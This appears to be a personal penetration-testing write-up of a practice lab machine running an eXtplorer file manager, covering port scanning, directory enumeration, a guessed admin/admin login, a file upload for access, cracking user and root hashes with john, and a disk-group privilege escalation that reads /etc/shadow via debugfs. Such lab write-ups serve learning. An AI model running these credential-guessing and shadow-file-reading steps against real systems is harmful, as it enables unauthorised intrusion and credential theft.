# nmap
```
┌──(kali㉿kali)-[~/PG/extplorer]
└─$ nmap -p- --min-rate 10000 192.168.165.16
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 03:54 EST
Nmap scan report for 192.168.165.16
Host is up (0.043s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
                                                                                                                                                     
┌──(kali㉿kali)-[~/PG/extplorer]
└─$ nmap -p 22,80 -sCV 192.168.165.16       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 03:55 EST
Nmap scan report for 192.168.165.16
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.79 seconds

```

![Pasted image 20250221165938](<0. Attachments/Pasted image 20250221165938.png>)
# web enum
```
┌──(kali㉿kali)-[~/PG/extplorer]
└─$ dirsearch -u http://192.168.165.16/     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict
/home/kali/.local/lib/python3.12/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/PG/extplorer/reports/http_192.168.165.16/__25-02-21_03-56-22.txt

Target: http://192.168.165.16/

[03:56:23] Starting: 
[03:56:28] 403 -  279B  - /.ht_wsr.txt                                      
[03:56:29] 403 -  279B  - /.htaccess.bak1                                   
[03:56:29] 403 -  279B  - /.htaccess.orig
[03:56:29] 403 -  279B  - /.htaccess.sample                                 
[03:56:29] 403 -  279B  - /.htaccess.save
[03:56:29] 403 -  279B  - /.htaccess_extra
[03:56:29] 403 -  279B  - /.htaccess_orig                                   
[03:56:29] 403 -  279B  - /.htaccessBAK
[03:56:29] 403 -  279B  - /.htaccess_sc                                     
[03:56:29] 403 -  279B  - /.htaccessOLD
[03:56:29] 403 -  279B  - /.htaccessOLD2
[03:56:29] 403 -  279B  - /.htm                                             
[03:56:29] 403 -  279B  - /.html
[03:56:29] 403 -  279B  - /.htpasswd_test                                   
[03:56:29] 403 -  279B  - /.htpasswds                                       
[03:56:29] 403 -  279B  - /.httr-oauth
[03:56:32] 403 -  279B  - /.php                                             
[03:57:31] 301 -  322B  - /filemanager  ->  http://192.168.165.16/filemanager/
[03:57:31] 200 -    2KB - /filemanager/                                     
[03:57:41] 302 -    0B  - /index.php/login/  ->  http://192.168.165.16/index.php/login/wp-admin/setup-config.php
[03:57:47] 200 -    7KB - /license.txt                                      
[03:58:16] 200 -    3KB - /readme.html                                      
[03:58:21] 403 -  279B  - /server-status                                    
[03:58:21] 403 -  279B  - /server-status/                                   
[03:58:53] 200 -  403B  - /wordpress/                                       
[03:58:53] 301 -  319B  - /wp-admin  ->  http://192.168.165.16/wp-admin/    
[03:58:54] 301 -  321B  - /wp-content  ->  http://192.168.165.16/wp-content/
[03:58:54] 200 -    0B  - /wp-content/                                      
[03:58:54] 200 -   84B  - /wp-content/plugins/akismet/akismet.php           
[03:58:55] 500 -    0B  - /wp-content/plugins/hello.php                     
[03:58:55] 301 -  322B  - /wp-includes  ->  http://192.168.165.16/wp-includes/
[03:58:55] 200 -    5KB - /wp-includes/                                     
[03:58:55] 200 -    0B  - /wp-includes/rss-functions.php                    
                                                                             
Task Completed 
```

![Pasted image 20250221165720](<0. Attachments/Pasted image 20250221165720.png>)

![Pasted image 20250221165815](<0. Attachments/Pasted image 20250221165815.png>)

guessed admin-admin

![Pasted image 20250221170438](<0. Attachments/Pasted image 20250221170438.png>)

hash in .htusers file
![Pasted image 20250221171216](<0. Attachments/Pasted image 20250221171216.png>)

# initial access
![Pasted image 20250221171827](<0. Attachments/Pasted image 20250221171827.png>)

upload the file
![Pasted image 20250221172405](<0. Attachments/Pasted image 20250221172405.png>)

![Pasted image 20250221172330](<0. Attachments/Pasted image 20250221172330.png>)

![Pasted image 20250221172426](<0. Attachments/Pasted image 20250221172426.png>)
# Cracking hash
![Pasted image 20250221171603](<0. Attachments/Pasted image 20250221171603.png>)

```
john dora.hash --wordlist=/home/kali/rockyou.txt
```

dora --> doraemon

# priv esc enum
become dora
![Pasted image 20250221172731](<0. Attachments/Pasted image 20250221172731.png>)

get local.txt
![Pasted image 20250221173015](<0. Attachments/Pasted image 20250221173015.png>)

find something interesting
![Pasted image 20250221173756](<0. Attachments/Pasted image 20250221173756.png>)
`6(disk)`

# priv esc
[Disk Group Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/disk-group-privilege-escalation/)

![Pasted image 20250221173954](<0. Attachments/Pasted image 20250221173954.png>)

```
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv

mkdir test

cat /etc/shadow
```

![Pasted image 20250221174243](<0. Attachments/Pasted image 20250221174243.png>)

cracking root hash
![Pasted image 20250221174501](<0. Attachments/Pasted image 20250221174501.png>)
```
john root.hash --wordlist=/home/kali/rockyou.txt
```

![Pasted image 20250221174939](<0. Attachments/Pasted image 20250221174939.png>)
# proof.txt

![Pasted image 20250221175005](<0. Attachments/Pasted image 20250221175005.png>)

